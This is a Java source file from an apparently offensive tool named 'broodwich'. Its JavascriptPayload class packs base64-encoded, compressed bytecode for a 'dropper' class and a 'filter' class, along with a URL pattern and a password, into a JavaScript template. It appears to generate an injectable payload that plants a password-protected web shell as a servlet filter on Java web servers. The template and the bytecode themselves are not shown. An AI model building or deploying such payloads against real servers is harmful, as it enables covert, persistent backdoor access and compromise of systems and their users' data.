package party.itistimeto.broodwich.payloads;

import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.charset.StandardCharsets;
import java.security.NoSuchAlgorithmException;
import java.text.MessageFormat;
import java.util.Base64;
import java.util.stream.Collectors;

public class JavascriptPayload extends AbstractPayload {
    public JavascriptPayload(String urlPattern, Class dropperClass, String password) throws NoSuchAlgorithmException, IOException, URISyntaxException {
        super(urlPattern, dropperClass, password);
    }

    @Override
    public String toString() {
        try {
            var jsTemplate = AbstractPayload.getResourceText("JavascriptPayloadTemplate.js");
            var templateParams = new Object[]{
                this.filterClass.getName(),
                this.dropperClass.getName(),
                Base64.getEncoder().encodeToString(this.compressedFilterBytecode),
                Base64.getEncoder().encodeToString(this.compressedDropperBytecode),
                this.urlPattern, /* care to self-js-inject? */
                this.password
            };
            // fyi: https://stackoverflow.com/questions/1187093/can-i-escape-braces-in-a-java-messageformat
            var js = MessageFormat.format(jsTemplate, templateParams);
            return js.lines().filter(line -> !line.startsWith("//")).collect(Collectors.joining());
        } catch (IOException | URISyntaxException e) {
            return e.getMessage(); // don't @ me
        }
    }

    @Override
    public byte[] toBytes() {
        return this.toString().getBytes(StandardCharsets.UTF_8);
    }
}